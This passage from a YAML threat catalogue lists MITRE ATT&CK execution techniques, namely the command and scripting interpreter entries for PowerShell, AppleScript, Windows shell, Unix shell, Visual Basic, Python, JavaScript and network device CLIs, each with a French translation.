          \ choisir d\u2019\xE9num\xE9rer les processus via '/proc'. ESXi prend \xE9\
          galement en charge l\u2019utilisation de la commande 'ps', ainsi que de\
          \ 'esxcli system process list'. (Citation : Sygnia ESXi Ransomware 2025)(Citation\
          \ : Crowdstrike Hyperviseur Jackpotting Partie 2 2021)\n\nSur les appareils\
          \ r\xE9seau, des commandes [CLI de dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB afficher les processus \xBB peuvent \xEAtre utilis\xE9\
          es pour afficher les processus en cours d\u2019ex\xE9cution. (Citation :\
          \ US-CERT-TA18-106A)(Citation : show_processes_cisco_cmd)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059
    ref_id: T1059
    name: Command and Scripting Interpreter
    description: 'Adversaries may abuse command and script interpreters to execute
      commands, scripts, or binaries. These interfaces and languages provide ways
      of interacting with computer systems and are a common feature across many different
      platforms. Most systems come with some built-in command-line interface and scripting
      capabilities, for example, macOS and Linux distributions include some flavor
      of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows
      installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)
      and [PowerShell](https://attack.mitre.org/techniques/T1059/001).


      There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006),
      as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007)
      and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).


      Adversaries may abuse these technologies in various ways as a means of executing
      arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001)
      payloads delivered to victims as lure documents or as secondary payloads downloaded
      from an existing C2. Adversaries may also execute commands through interactive
      terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021)
      in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation:
      Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell
      Execution in Python)'
    translations:
      fr:
        name: "Interpr\xE8te de commande et de script"
        description: "Les adversaires peuvent abuser des commandes et des interpr\xE9\
          teurs de scripts pour ex\xE9cuter des commandes, scripts ou binaires. Ces\
          \ interfaces et langages offrent des moyens d\u2019interagir avec les syst\xE8\
          mes informatiques et sont une caract\xE9ristique commune sur de nombreuses\
          \ plateformes diff\xE9rentes. La plupart des syst\xE8mes sont \xE9quip\xE9\
          s d\u2019une interface en ligne de commande et de fonctionnalit\xE9s de\
          \ scripting int\xE9gr\xE9es, par exemple, les distributions macOS et Linux\
          \ incluent une version de [Unix Shell](https://attack.mitre.org/techniques/T1059/004)\
          \ tandis que les installations Windows incluent le [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)\
          \ et [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIl\
          \ existe \xE9galement des interpr\xE9teurs multiplateformes tels que [Python](https://attack.mitre.org/techniques/T1059/006),\
          \ ainsi que ceux couramment associ\xE9s aux applications clientes telles\
          \ que [JavaScript](https://attack.mitre.org/techniques/T1059/007) et [Visual\
          \ Basic](https://attack.mitre.org/techniques/T1059/005).\n\nLes adversaires\
          \ peuvent abuser de ces technologies de diverses mani\xE8res pour ex\xE9\
          cuter des commandes arbitraires. Les commandes et scripts peuvent \xEAtre\
          \ int\xE9gr\xE9s dans des charges utiles [Acc\xE8s Initial](https://attack.mitre.org/tactics/TA0001)\
          \ livr\xE9es aux victimes sous forme de documents leurres ou comme charges\
          \ utiles secondaires t\xE9l\xE9charg\xE9es depuis un C2 existant. Les adversaires\
          \ peuvent \xE9galement ex\xE9cuter des commandes via des terminaux/shells\
          \ interactifs, ainsi que utiliser divers [Services Distantes](https://attack.mitre.org/techniques/T1021)\
          \ afin d\u2019obtenir une ex\xE9cution \xE0 distance. (Citation : Commandes\
          \ \xE0 distance Powershell)(Citation : Cisco IOS Software Integrity Assurance\
          \ - Historique des commandes)(Citation : Ex\xE9cution \xE0 distance en shell\
          \ en Python)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.001
    ref_id: T1059.001
    name: PowerShell
    description: 'Adversaries may abuse PowerShell commands and scripts for execution.
      PowerShell is a powerful interactive command-line interface and scripting environment
      included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries
      can use PowerShell to perform a number of actions, including discovery of information
      and execution of code. Examples include the <code>Start-Process</code> cmdlet
      which can be used to run an executable and the <code>Invoke-Command</code> cmdlet
      which runs a command locally or on a remote computer (though administrator permissions
      are required to use PowerShell to connect to remote systems).


      PowerShell may also be used to download and run executables from the Internet,
      which can be executed from disk or in memory without touching disk.


      A number of PowerShell-based offensive testing tools are available, including
      [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194),
      [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github
      PSAttack)


      PowerShell commands/scripts can also be executed without directly invoking the
      <code>powershell.exe</code> binary through interfaces to PowerShell''s underlying
      <code>System.Management.Automation</code> assembly DLL exposed through the .NET
      framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick
      Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp
      APR 2014)

      https://attack.mitre.org/techniques/T1059/001'
    translations:
      fr:
        name: PowerShell
        description: "Les adversaires peuvent abuser des commandes et scripts PowerShell\
          \ pour leur ex\xE9cution. PowerShell est une interface interactive puissante\
          \ en ligne de commande et un environnement de script inclus dans le syst\xE8\
          me d\u2019exploitation Windows. (Citation : TechNet PowerShell) Les adversaires\
          \ peuvent utiliser PowerShell pour effectuer un certain nombre d\u2019actions,\
          \ y compris la d\xE9couverte d\u2019informations et l\u2019ex\xE9cution\
          \ de code. Parmi les exemples, on trouve le <code>cmdlet Start-Process</code>,\
          \ qui peut \xEAtre utilis\xE9 pour ex\xE9cuter un ex\xE9cutable, et le cmdlet\
          \ <code>Invoke-Command</code>, qui ex\xE9cute une commande localement ou\
          \ sur un ordinateur distant (bien que des autorisations administrateur soient\
          \ n\xE9cessaires pour utiliser PowerShell afin de se connecter \xE0 des\
          \ syst\xE8mes distants).\n\nPowerShell peut \xE9galement \xEAtre utilis\xE9\
          \ pour t\xE9l\xE9charger et ex\xE9cuter des ex\xE9cutables depuis Internet,\
          \ qui peuvent \xEAtre ex\xE9cut\xE9s depuis le disque ou en m\xE9moire sans\
          \ toucher au disque.\n\nUn certain nombre d\u2019outils de test offensif\
          \ bas\xE9s sur PowerShell sont disponibles, notamment [Empire](https://attack.mitre.org/software/S0363),\
          \ [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378)\
          \ et PSAttack. (Citation : Github PSAttack)\n\nLes commandes/scripts PowerShell\
          \ peuvent \xE9galement \xEAtre ex\xE9cut\xE9s sans invoquer directement\
          \ le <code>binaire powershell.exe</code> via des interfaces vers la DLL\
          \ <code>Assembly sous-jacente System.Management.Automation</code> de PowerShell,\
          \ expos\xE9e via le framework .NET et Windows Common Language Interface\
          \ (CLI). (Citation : Sixdub PowerPick janv. 2016)(Citation : SilentBreak\
          \ Offensive PS d\xE9c. 2015)(Citation : Microsoft PSfromCsharp avril 2014)\n\
          https://attack.mitre.org/techniques/T1059/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.002
    ref_id: T1059.002
    name: AppleScript
    description: "Adversaries may abuse AppleScript for execution. AppleScript is\
      \ a macOS scripting language designed to control applications and parts of the\
      \ OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript)\
      \ These AppleEvent messages can be sent independently or easily scripted with\
      \ AppleScript. These events can locate open windows, send keystrokes, and interact\
      \ with almost any open application locally or remotely.\n\nScripts can be run\
      \ from the command-line via <code>osascript /path/to/script</code> or <code>osascript\
      \ -e \"script here\"</code>. Aside from the command line, scripts can be executed\
      \ in numerous ways including Mail rules, Calendar.app alarms, and Automator\
      \ workflows. AppleScripts can also be executed as plain text shell scripts by\
      \ adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation:\
      \ SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code>\
      \ to execute. However, they may be executed from within mach-O binaries by using\
      \ the macOS [Native API](https://attack.mitre.org/techniques/T1106)s\_<code>NSAppleScript</code>\_\
      or\_<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code>\
      \ command line utility.\n\nAdversaries may abuse AppleScript to execute various\
      \ behaviors, such as interacting with an open SSH connection, moving to remote\
      \ machines, and even presenting users with fake dialog boxes. These events cannot\
      \ start applications remotely (they can start them locally), but they can interact\
      \ with applications if they're already running remotely. On macOS 10.10 Yosemite\
      \ and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s,\
      \ which otherwise would require compilation and execution in a mach-O binary\
      \ file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting\
      \ language, it can be used to launch more common techniques as well such as\
      \ a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation:\
      \ Macro Malware Targets Macs)\nhttps://attack.mitre.org/techniques/T1059/002"
    translations:
      fr:
        name: AppleScript
        description: "Les adversaires peuvent abuser d\u2019AppleScript pour l\u2019\
          ex\xE9cution. AppleScript est un langage de script pour macOS con\xE7u pour\
          \ contr\xF4ler les applications et certaines parties du syst\xE8me d\u2019\
          exploitation via des messages interapplications appel\xE9s AppleEvents.\
          \ (Citation : Apple AppleScript) Ces messages AppleEvent peuvent \xEAtre\
          \ envoy\xE9s ind\xE9pendamment ou facilement script\xE9s avec AppleScript.\
          \ Ces \xE9v\xE9nements peuvent localiser des fen\xEAtres ouvertes, envoyer\
          \ des frappes clavier et interagir avec presque n\u2019importe quelle application\
          \ ouverte, localement ou \xE0 distance.\n\nLes scripts peuvent \xEAtre ex\xE9\
          cut\xE9s depuis la ligne de commande via <code>osascript /path/to/script</code>\
          \ ou <code>osascript -e \xAB script ici</code> \xBB. En dehors de la ligne\
          \ de commande, les scripts peuvent \xEAtre ex\xE9cut\xE9s de nombreuses\
          \ fa\xE7ons, notamment les r\xE8gles Mail, les alarmes Calendar.app et les\
          \ flux de travail Automator. Les AppleScripts peuvent \xE9galement \xEA\
          tre ex\xE9cut\xE9s comme des scripts de shell en texte brut en ajoutant\
          \ <code>#\_!/usr/bin/osascript</code> au d\xE9but du fichier script. (Citation\
          \ : SentinelOne AppleScript)\n\nLes AppleScripts n\u2019ont pas besoin d\u2019\
          appeler <code>osascript</code> pour s\u2019ex\xE9cuter. Cependant, ils peuvent\
          \ \xEAtre ex\xE9cut\xE9s depuis des binaires mach-O en utilisant les fichiers\
          \ macOS [Native API](https://attack.mitre.org/techniques/T1106)<code>s NSAppleScript</code>\
          \ ou <code>OSAScript</code>, qui ex\xE9cutent tous deux du code ind\xE9\
          pendamment de l\u2019utilitaire <code>de ligne de commande /usr/bin/osascript</code>.\n\
          \nLes adversaires peuvent abuser d\u2019AppleScript pour ex\xE9cuter divers\
          \ comportements, comme interagir avec une connexion SSH ouverte, se d\xE9\
          placer vers des machines distantes, voire pr\xE9senter aux utilisateurs\
          \ de fausses bo\xEEtes de dialogue. Ces \xE9v\xE9nements ne peuvent pas\
          \ d\xE9marrer des applications \xE0 distance (ils peuvent les lancer localement),\
          \ mais ils peuvent interagir avec des applications si elles tournent d\xE9\
          j\xE0 \xE0 distance. Sur macOS 10.10 Yosemite et versions sup\xE9rieures,\
          \ AppleScript a la capacit\xE9 d\u2019ex\xE9cuter des [API natives](https://attack.mitre.org/techniques/T1106),\
          \ qui n\xE9cessiteraient autrement une compilation et une ex\xE9cution dans\
          \ un format binaire mach-O. (Citation : \xC9quipe rouge SentinelOne macOS)\
          \ Puisqu\u2019il s\u2019agit d\u2019un langage de script, il peut \xE9galement\
          \ \xEAtre utilis\xE9 pour lancer des techniques plus courantes, comme un\
          \ shell invers\xE9 via [Python](https://attack.mitre.org/techniques/T1059/006).\
          \ (Citation : Macro Malware ciblant les Macs)\nhttps://attack.mitre.org/techniques/T1059/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.003
    ref_id: T1059.003
    name: Windows Command Shell
    description: 'Adversaries may abuse the Windows command shell for execution. The
      Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the
      primary command prompt on Windows systems. The Windows command prompt can be
      used to control almost any aspect of a system, with various permission levels
      required for different subsets of commands. The command prompt can be invoked
      remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such
      as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)


      Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential
      commands to run, as well as normal scripting operations such as conditionals
      and loops. Common uses of batch files include long or repetitive tasks, or the
      need to run the same set of commands on multiple systems.


      Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute
      various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106)
      to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106)
      interactively with input and output forwarded over a command and control channel.

      https://attack.mitre.org/techniques/T1059/003'
    translations:
      fr:
        name: Shell de commandes Windows
        description: "Les adversaires peuvent abuser du shell de commande Windows\
          \ pour l\u2019ex\xE9cution. Le shell de commande Windows ([cmd](https://attack.mitre.org/software/S0106))\
          \ est l\u2019invite de commande principale sur les syst\xE8mes Windows.\
          \ L\u2019invite de commande Windows peut \xEAtre utilis\xE9e pour contr\xF4\
          ler presque n\u2019importe quel aspect d\u2019un syst\xE8me, avec diff\xE9\
          rents niveaux d\u2019autorisation requis pour diff\xE9rents sous-ensembles\
          \ de commandes. L\u2019invite de commande peut \xEAtre invoqu\xE9e \xE0\
          \ distance via [Services \xE0 distance](https://attack.mitre.org/techniques/T1021)\
          \ tels que [SSH](https://attack.mitre.org/techniques/T1021/004). (Citation\
          \ : SSH sous Windows)\n\nLes fichiers batch (ex\_: .bat ou .cmd) fournissent\
          \ \xE9galement au shell une liste de commandes s\xE9quentielles \xE0 ex\xE9\
          cuter, ainsi que des op\xE9rations de script normales telles que les conditionnels\
          \ et les boucles. Les usages courants des fichiers batch incluent des t\xE2\
          ches longues ou r\xE9p\xE9titives, ou la n\xE9cessit\xE9 d\u2019ex\xE9cuter\
          \ le m\xEAme ensemble de commandes sur plusieurs syst\xE8mes.\n\nLes adversaires\
          \ peuvent utiliser [cmd](https://attack.mitre.org/software/S0106) pour ex\xE9\
          cuter diverses commandes et charges utiles. Les usages courants incluent\
          \ [cmd](https://attack.mitre.org/software/S0106) pour ex\xE9cuter une seule\
          \ commande, ou l\u2019abus de [cmd](https://attack.mitre.org/software/S0106)\
          \ de mani\xE8re interactive avec l\u2019entr\xE9e et la sortie transmises\
          \ via un canal de commande et de contr\xF4le.\nhttps://attack.mitre.org/techniques/T1059/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.004
    ref_id: T1059.004
    name: Unix Shell
    description: 'Adversaries may abuse Unix shell commands and scripts for execution.
      Unix shells are the primary command prompt on Linux, macOS, and ESXi systems,
      though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.)
      depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation:
      Apple ZShell) Unix shells can control every aspect of a system, with certain
      commands requiring elevated privileges.


      Unix shells also support scripts that enable sequential execution of commands
      as well as other typical programming operations such as conditionals and loops.
      Common uses of shell scripts include long or repetitive tasks, or the need to
      run the same set of commands on multiple systems.


      Adversaries may abuse Unix shells to execute various commands or payloads. Interactive
      shells may be accessed through command and control channels or during lateral
      movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004).
      Adversaries may also leverage shell scripts to deliver and execute multiple
      commands on victims or as part of payloads used for persistence.


      Some systems, such as embedded devices, lightweight Linux distributions, and
      ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable
      that contains a variety of tools, including a simple shell.

      https://attack.mitre.org/techniques/T1059/004'
    translations:
      fr:
        name: Unix Shell
        description: "Les adversaires peuvent abuser des commandes et scripts du shell\
          \ Unix pour leur ex\xE9cution. Les shells Unix sont l\u2019invite de commande\
          \ principale sur Linux, macOS et ESXi, bien que de nombreuses variantes\
          \ du shell Unix existent (e.g. sh, ash, bash, zsh, etc.) selon le syst\xE8\
          me d\u2019exploitation ou la distribution sp\xE9cifique. (Citation : DieNet\
          \ Bash)(Citation : Apple ZShell) Les shells Unix peuvent contr\xF4ler tous\
          \ les aspects d\u2019un syst\xE8me, certaines commandes n\xE9cessitant des\
          \ privil\xE8ges \xE9lev\xE9s.\n\nLes shells Unix prennent \xE9galement en\
          \ charge des scripts permettant l\u2019ex\xE9cution s\xE9quentielle de commandes\
          \ ainsi que d\u2019autres op\xE9rations de programmation typiques telles\
          \ que les conditionnels et les boucles. Les usages courants des scripts\
          \ shell incluent des t\xE2ches longues ou r\xE9p\xE9titives, ou la n\xE9\
          cessit\xE9 d\u2019ex\xE9cuter le m\xEAme ensemble de commandes sur plusieurs\
          \ syst\xE8mes.\n\nLes adversaires peuvent abuser des shells Unix pour ex\xE9\
          cuter diverses commandes ou charges utiles. Les coques interactives peuvent\
          \ \xEAtre accessibles via des canaux de commande et de contr\xF4le ou lors\
          \ de mouvements lat\xE9raux comme avec [SSH](https://attack.mitre.org/techniques/T1021/004).\
          \ Les adversaires peuvent \xE9galement utiliser des scripts shell pour livrer\
          \ et ex\xE9cuter plusieurs commandes sur les victimes ou dans le cadre de\
          \ charges utiles utilis\xE9es pour la persistance.\n\nCertains syst\xE8\
          mes, tels que les p\xE9riph\xE9riques embarqu\xE9s, les distributions Linux\
          \ l\xE9g\xE8res et les serveurs ESXi, peuvent exploiter des shells Unix\
          \ simplifi\xE9s via Busybox, un petit ex\xE9cutable qui contient une vari\xE9\
          t\xE9 d\u2019outils, y compris un shell simple.\nhttps://attack.mitre.org/techniques/T1059/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.005
    ref_id: T1059.005
    name: Visual Basic
    description: 'Adversaries may abuse Visual Basic (VB) for execution. VB is a programming
      language created by Microsoft with interoperability with many Windows technologies
      such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001)
      and the [Native API](https://attack.mitre.org/techniques/T1106) through the
      Windows API. Although tagged as legacy with no planned future evolutions, VB
      is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation:
      VB .NET Mar 2020)(Citation: VB Microsoft)


      Derivative languages based on VB have also been created, such as Visual Basic
      for Applications (VBA) and VBScript. VBA is an event-driven programming language
      built into Microsoft Office, as well as several third-party applications.(Citation:
      Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros
      used to automate the execution of tasks and other functionality on the host.
      VBScript is a default scripting language on Windows hosts and can also be used
      in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML
      Application (HTA) webpages served to Internet Explorer (though most modern browsers
      do not come with VBScript support).(Citation: Microsoft VBScript)


      Adversaries may use VB payloads to execute malicious commands. Common malicious
      usage includes automating execution of behaviors with VBScript or embedding
      VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)
      payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005)
      to enable execution).(Citation: Default VBS macros Blocking )

      https://attack.mitre.org/techniques/T1059/005'
    translations:
      fr:
        name: Visual Basic
        description: "Les adversaires peuvent abuser de Visual Basic (VB) pour l\u2019\
          ex\xE9cution. VB est un langage de programmation cr\xE9\xE9 par Microsoft\
          \ avec l\u2019interop\xE9rabilit\xE9 avec de nombreuses technologies Windows\
          \ telles que [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
          \ et la [Native API](https://attack.mitre.org/techniques/T1106) via l\u2019\
          API Windows. Bien que marqu\xE9 comme h\xE9rit\xE9 sans \xE9volutions futures\
          \ pr\xE9vues, VB est int\xE9gr\xE9 et support\xE9 dans le .NET Framework\
          \ et le .NET Core multiplateforme. (Citation : VB .NET mars 2020)(Citation\
          \ : VB Microsoft)\n\nDes langages d\xE9riv\xE9s bas\xE9s sur VB ont \xE9\
          galement \xE9t\xE9 cr\xE9\xE9s, tels que Visual Basic for Applications (VBA)\
          \ et VBScript. VBA est un langage de programmation pilot\xE9 par des \xE9\
          v\xE9nements int\xE9gr\xE9 \xE0 Microsoft Office, ainsi qu\u2019\xE0 plusieurs\
          \ applications tierces. (Citation : Microsoft VBA)(Citation : Wikip\xE9\
          dia VBA) VBA permet aux documents de contenir des macros utilis\xE9es pour\
          \ automatiser l\u2019ex\xE9cution de t\xE2ches et d\u2019autres fonctionnalit\xE9\
          s sur l\u2019h\xF4te. VBScript est un langage de script par d\xE9faut sur\
          \ les h\xF4tes Windows et peut \xE9galement \xEAtre utilis\xE9 \xE0 la place\
          \ de [JavaScript](https://attack.mitre.org/techniques/T1059/007) sur les\
          \ pages web HTML Application (HTA) servies \xE0 Internet Explorer (bien\
          \ que la plupart des navigateurs modernes ne prennent pas en charge VBScript).\
          \ (Citation : Microsoft VBScript)\n\nLes adversaires peuvent utiliser des\
          \ charges utiles VB pour ex\xE9cuter des commandes malveillantes. L\u2019\
          usage malveillant courant inclut l\u2019automatisation de l\u2019ex\xE9\
          cution de comportements avec VBScript ou l\u2019int\xE9gration de contenu\
          \ VBA dans des charges utiles [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)\
          \ (ce qui peut \xE9galement impliquer [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005)\
          \ pour permettre l\u2019ex\xE9cution). (Citation : Macros VBS par d\xE9\
          faut en blocage)\nhttps://attack.mitre.org/techniques/T1059/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.006
    ref_id: T1059.006
    name: Python
    description: 'Adversaries may abuse Python commands and scripts for execution.
      Python is a very popular scripting/programming language, with capabilities to
      perform many functions. Python can be executed interactively from the command-line
      (via the <code>python.exe</code> interpreter) or via scripts (.py) that can
      be written and distributed to different systems. Python code can also be compiled
      into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)


      Python comes with many built-in packages to interact with the underlying system,
      such as file operations and device I/O. Adversaries can use these libraries
      to download and execute commands or other scripts as well as perform various
      malicious behaviors.

      https://attack.mitre.org/techniques/T1059/006'
    translations:
      fr:
        name: Python
        description: "Les adversaires peuvent abuser des commandes et scripts Python\
          \ pour l\u2019ex\xE9cution. Python est un langage de script/programmation\
          \ tr\xE8s populaire, avec des capacit\xE9s pour accomplir de nombreuses\
          \ fonctions. Python peut \xEAtre ex\xE9cut\xE9 de mani\xE8re interactive\
          \ depuis la ligne de commande (via <code>l\u2019interpr\xE9teur python.exe</code>)\
          \ ou via des scripts (.py) qui peuvent \xEAtre \xE9crits et distribu\xE9\
          s \xE0 diff\xE9rents syst\xE8mes. Le code Python peut \xE9galement \xEA\
          tre compil\xE9 en ex\xE9cutables binaires. (Citation : Zscaler APT31 Covid-19\
          \ octobre 2020)\n\nPython est livr\xE9 avec de nombreux paquets int\xE9\
          gr\xE9s pour interagir avec le syst\xE8me sous-jacent, tels que les op\xE9\
          rations de fichiers et les E/S des appareils. Les adversaires peuvent utiliser\
          \ ces biblioth\xE8ques pour t\xE9l\xE9charger et ex\xE9cuter des commandes\
          \ ou d\u2019autres scripts, ainsi que pour effectuer divers comportements\
          \ malveillants.\nhttps://attack.mitre.org/techniques/T1059/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.007
    ref_id: T1059.007
    name: JavaScript
    description: "Adversaries may abuse various implementations of JavaScript for\
      \ execution. JavaScript (JS) is a platform-independent scripting language (compiled\
      \ just-in-time at runtime) commonly associated with scripts in webpages, though\
      \ JS can be executed in runtime environments outside the browser.(Citation:\
      \ NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard.\
      \ JScript is interpreted via the Windows Script engine and thus integrated with\
      \ many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
      \ and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation:\
      \ Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript\
      \ for Automation (JXA) is a macOS scripting language based on JavaScript, included\
      \ as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced\
      \ in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control\
      \ applications, interface with the operating system, and bridge access into\
      \ the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports\
      \ two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002).\
      \ Scripts can be executed via the command line utility <code>osascript</code>,\
      \ they can be compiled into applications or script files via <code>osacompile</code>,\
      \ and they can be compiled and executed in memory of other programs by leveraging\
      \ the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation:\
      \ SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary\
      \ Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries\
      \ may abuse various implementations of JavaScript to execute various behaviors.\
      \ Common uses include hosting malicious scripts on websites as part of a [Drive-by\
      \ Compromise](https://attack.mitre.org/techniques/T1189) or downloading and\
      \ executing these script files as secondary payloads. Since these payloads are\
      \ text-based, it is also very common for adversaries to obfuscate their content\
      \ as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\
      https://attack.mitre.org/techniques/T1059/007"
    translations:
      fr:
        name: JavaScript
        description: "Les adversaires peuvent abuser de diverses impl\xE9mentations\
          \ de JavaScript pour l\u2019ex\xE9cution. JavaScript (JS) est un langage\
          \ de script ind\xE9pendant de la plateforme (compil\xE9 juste-\xE0-temps\
          \ \xE0 l\u2019ex\xE9cution) couramment associ\xE9 aux scripts dans les pages\
          \ web, bien que JS puisse \xEAtre ex\xE9cut\xE9 dans des environnements\
          \ d\u2019ex\xE9cution hors navigateur. (Citation : NodeJS)\n\nJScript est\
          \ l\u2019impl\xE9mentation Microsoft de la m\xEAme norme de scripting. JScript\
          \ est interpr\xE9t\xE9 via le moteur Windows Script et est donc int\xE9\
          gr\xE9 \xE0 de nombreux composants de Windows, tels que les pages [Component\
          \ Object Model](https://attack.mitre.org/techniques/T1559/001) et Internet\
          \ Explorer HTML Application (HTA). (Citation : JScrip mai 2018)(Citation\
          \ : Microsoft JScript 2007)(Citation : Microsoft Windows Scripts)\n\nJavaScript\
          \ pour l\u2019automatisation (JXA) est un langage de script pour macOS bas\xE9\
          \ sur JavaScript, inclus dans le cadre de l\u2019Open Scripting Architecture\
          \ (OSA) d\u2019Apple, qui a \xE9t\xE9 introduit dans OSX 10.10. Le syst\xE8\
          me d\u2019exploitation d\u2019Apple offre des capacit\xE9s de script pour\
          \ contr\xF4ler les applications, interfacer avec le syst\xE8me d\u2019exploitation\
          \ et relier l\u2019acc\xE8s au reste des API internes d\u2019Apple. Depuis\
          \ OSX 10.10, OSA ne prend en charge que deux langages, JXA et [AppleScript](https://attack.mitre.org/techniques/T1059/002).\
          \ Les scripts peuvent \xEAtre ex\xE9cut\xE9s via l\u2019utilitaire en ligne\
          \ <code>de commande osascript</code>, ils peuvent \xEAtre compil\xE9s en\
          \ applications ou fichiers script via <code>osacompilale</code>, et ils\
          \ peuvent \xEAtre compil\xE9s et ex\xE9cut\xE9s en m\xE9moire d\u2019autres\
          \ programmes en utilisant le cadre OSAKit. (Citation : Apple About Mac Scripting\
          \ 2016)(Citation : SpecterOps JXA 2020)(Citation : \xC9quipe rouge SentinelOne\
          \ macOS)(Citation : Bruant argent\xE9 du Canari rouge f\xE9vrier 2021)(Citation\
          \ : MDSec macOS JXA et VSCode)\n\nLes adversaires peuvent abuser de diverses\
          \ impl\xE9mentations de JavaScript pour ex\xE9cuter diff\xE9rents comportements.\
          \ Les usages courants incluent l\u2019h\xE9bergement de scripts malveillants\
          \ sur des sites web dans le cadre d\u2019une [Compromission en drive-by](https://attack.mitre.org/techniques/T1189)\
          \ ou le t\xE9l\xE9chargement et l\u2019ex\xE9cution de ces fichiers de script\
          \ en tant que charges utiles secondaires. Puisque ces charges utiles sont\
          \ bas\xE9es sur du texte, il est \xE9galement tr\xE8s courant que les adversaires\
          \ obscurcissent leur contenu dans le cadre de [Fichiers ou Informations\
          \ Obscurciss\xE9s](https://attack.mitre.org/techniques/T1027).\nhttps://attack.mitre.org/techniques/T1059/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.008
    ref_id: T1059.008
    name: Network Device CLI
    description: "Adversaries may abuse scripting or built-in command line interpreters\
      \ (CLI) on network devices to execute malicious command and payloads. The CLI\
      \ is the primary means through which users and administrators interact with\
      \ the device in order to view system information, modify device operations,\
      \ or perform diagnostic and administrative functions. CLIs typically contain\
      \ various permission levels required for different commands. \n\nScripting interpreters\
      \ automate tasks and extend functionality beyond the command set included in\
      \ the network OS. The CLI and scripting interpreter are accessible through a\
      \ direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\
      \nAdversaries can use the network CLI to change how network devices behave and\
      \ operate. The CLI may be used to manipulate traffic flows to intercept or manipulate\
      \ data, modify startup configuration parameters to load malicious system software,\
      \ or to disable security features or logging to avoid detection.(Citation: Cisco\
      \ Synful Knock Evolution)\nhttps://attack.mitre.org/techniques/T1059/008"
    translations:
      fr:
        name: "CLI de dispositif r\xE9seau"
        description: "Les adversaires peuvent abuser de scripts ou d\u2019interpr\xE9\
          teurs en ligne de commande (CLI) int\xE9gr\xE9s sur les dispositifs r\xE9\
          seau pour ex\xE9cuter des commandes et des charges utiles malveillantes.\
          \ La CLI est le principal moyen par lequel les utilisateurs et les administrateurs\
          \ interagissent avec l\u2019appareil afin de consulter les informations\
          \ syst\xE8me, modifier les op\xE9rations de l\u2019appareil ou effectuer\
          \ des fonctions de diagnostic et administratives. Les CLI contiennent g\xE9\
          n\xE9ralement diff\xE9rents niveaux d\u2019autorisation requis pour diff\xE9\
          rentes commandes. \n\nLes interpr\xE9teurs de scripts automatisent les t\xE2\
